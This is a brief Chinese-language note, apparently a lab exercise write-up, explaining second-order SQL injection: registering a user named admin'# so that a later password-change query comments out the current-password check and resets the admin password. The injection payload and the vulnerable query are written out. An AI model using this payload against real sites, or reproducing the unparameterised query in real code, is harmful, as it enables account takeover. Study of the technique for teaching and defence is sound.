# 二次注入

# 首先注册一个admin'#的账户，密码123456

# 然后登陆admin'#用户进行修改密码操作

# 由于修改密码操作的sql语句为
# $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";

# 所以加入post数据变为
# $sql = "UPDATE users SET PASSWORD='123123' where username='admin'#' and password='123456' 

# 即admin密码被修改为123123